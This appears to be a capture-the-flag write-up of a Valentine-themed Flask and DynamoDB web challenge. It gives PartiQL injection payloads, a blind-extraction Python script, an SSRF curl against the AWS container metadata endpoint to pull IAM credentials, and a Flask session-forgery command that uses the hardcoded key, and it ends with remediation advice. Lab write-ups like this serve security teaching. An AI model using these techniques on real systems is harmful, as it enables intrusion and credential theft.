# Task 7 - Cloud Nine (Cupid's Arrow)

## Overview

**Difficulty**: Hard  
**Type**: Web Exploitation / Cloud Security  
**Flags**: 3 total  
**Techniques**: SQL Injection (PartiQL/DynamoDB), SSRF, Flask Session Forgery, AWS Metadata Enumeration

---

## Background

Cloud Nine (Cupid's Arrow) is a Valentine's Day-themed web application that allows users to send virtual love notes. The application is built on Flask and uses AWS DynamoDB for data storage. The challenge involves exploiting multiple vulnerabilities to retrieve three flags.

**Target Application**: http://54.205.77.77:8080/  
**Docker Image**: `public.ecr.aws/x2q4d0z7/cloudnine-app:latest`

---

## Vulnerability Analysis

### Source Code Review

Analyzing the Flask application source code (`app.py`) reveals critical vulnerabilities:

#### 1. SQL Injection (Admin Panel - DynamoDB/PartiQL)

The admin lookup functionality uses string concatenation in PartiQL statements:

```python
response = dynamodb.meta.client.execute_statement(
    Statement="SELECT * FROM \"" + USERS_TABLE + "\" WHERE username = '" + username + "'"
)
```

This allows SQL/PartiQL injection through the username parameter.

#### 2. Server-Side Request Forgery (SSRF)

The `/status/check` endpoint accepts arbitrary URLs:

```python
@app.get("/status/check")
def status_check():
    url = request.args.get("url", "").strip()
    # No validation - fetches any URL
    with urllib.request.urlopen(url, timeout=5) as response:
        ...
```

#### 3. Hardcoded Flask Secret Key

```python
app.secret_key = "change-me-in-production-but-for-real-this-time-please-no-kidding"
```

#### 4. Credentials Disclosure

Test credentials are hardcoded in comments:
- **Username**: `test`
- **Password**: `cup1dKuPiDqup!d`

---

## Step-by-Step Walkthrough

### Phase 1: Initial Access

#### Enumerate the Application

Navigate to the application:
```
http://54.205.77.77:8080/
```

The application redirects to the login page.

#### Login with Test Credentials

Use the discovered test credentials:

- **Username**: `test`
- **Password**: `cup1dKuPiDqup!d`

**FLAG1**: `THM{CUPID_ARROW_TEST_USER}`

---

### Phase 2: SQL Injection (DynamoDB/PartiQL)

#### Access Admin Panel

After logging in, navigate to the admin panel:
```
http://54.205.77.77:8080/admin
```

#### Exploit SQL Injection

The admin lookup functionality is vulnerable to PartiQL injection. Use boolean-based enumeration to extract flag2:

**Payload to extract FLAG2:**
```
Username: admin' OR '1'='1
```

This returns user data including flag2.

**Alternative payloads:**

1. Enumerate all users:
```
Username: test' OR '1'='1' --
```

**FLAG2**: `THM{CUPID_ARROW_FLAG2}`

---

### Phase 3: Enumerate Guest User Password

The guest user's password field contains FLAG3:

#### Blind Enumeration Script

```python
import requests

url = "http://54.205.77.77:8080/admin"
cookies = {"session": "your-session-cookie"}

# Enumerate character by character
charset = "abcdefghijklmnopqrstuvwxyz0123456789-_{}"
password = "THM{"

while True:
    for char in charset:
        payload = f"guest' OR begins_with(\"password\", '{password}{char}') OR username = '"
        data = {"action": "lookup", "username": payload}
        r = requests.post(url, cookies=cookies, data=data)
        if "User loaded" in r.text:
            password += char
            print(f"Found: {password}")
            break
```

**FLAG3**: `THM{partiqls_of_love}`

---

### Phase 4: SSRF Exploitation (Optional)

#### Identify SSRF Endpoint

The `/status/check` endpoint accepts a `url` parameter and fetches it server-side:

```
http://54.205.77.77:8080/status/check?url=...
```

#### Access AWS Metadata

On AWS-hosted instances, exploit SSRF to access the Instance Metadata Service:

```bash
curl "http://54.205.77.77:8080/status/check?url=http://169.254.170.2/v2/metadata"
```

This returns IAM credentials if the application runs on AWS with container credentials.

---

### Phase 5: Session Forgery (Optional)

#### Extract Secret Key

From source code analysis:
```python
app.secret_key = "change-me-in-production-but-for-real-this-time-please-no-kidding"
```

#### Forge Admin Session

Use Flask-UnSign to forge a session cookie:

```bash
# Install flask-unsign
pip3 install flask-unsign

# Sign an admin session
flask-unsign --sign --cookie "{'admin': True, 'user': 'admin'}" --secret "change-me-in-production-but-for-real-this-time-please-no-kidding"
```

Use the forged cookie to access the admin panel directly.

---

## Summary of Flags

| Flag | Location | Technique |
|------|----------|-----------|
| `THM{CUPID_ARROW_TEST_USER}` | Test user account (login with test/cup1dKuPiDqup!d) | Credentials in source code comments |
| `THM{CUPID_ARROW_FLAG2}` | Admin panel user data | SQL Injection (PartiQL) enumeration |
| `THM{partiqls_of_love}` | Guest user's password field | SQL Injection (PartiQL) with begins_with() |

---

## Attack Chain Summary

1. **Information Disclosure**: Source code in comments reveals test credentials
2. **Initial Access**: Login with test credentials to access the application
3. **SQL Injection**: Exploit admin lookup with `begins_with()` to enumerate flags from user data
4. **SSRF (Optional)**: Use `/status/check` to access AWS metadata services
5. **Session Forgery**: Use Flask-UnSign with hardcoded secret to forge admin session

---

## Remediation Recommendations

1. **Remove Hardcoded Secrets**: Never store credentials or secrets in source code
2. **Input Validation**: Use parameterized queries or ORM; avoid string concatenation
3. **SSRF Protection**: Implement allow-list validation for URL fetching functionality
4. **Session Security**: Use unique, strong secret keys per deployment; rotate regularly
5. **Database Security**: Apply least privilege IAM roles; avoid storing flags as user data

---

## Key Learning Points

- **PartiQL/DynamoDB Injection**: SQL injection techniques apply to NoSQL query languages
- **Boolean-based Enumeration**: Use functions like `begins_with()` for blind extraction
- **SSRF to Cloud**: Metadata endpoints (169.254.169.254, 169.254.170.2) are high-value SSRF targets
- **Flask Session Security**: Hardcoded secrets enable complete session forgery

---
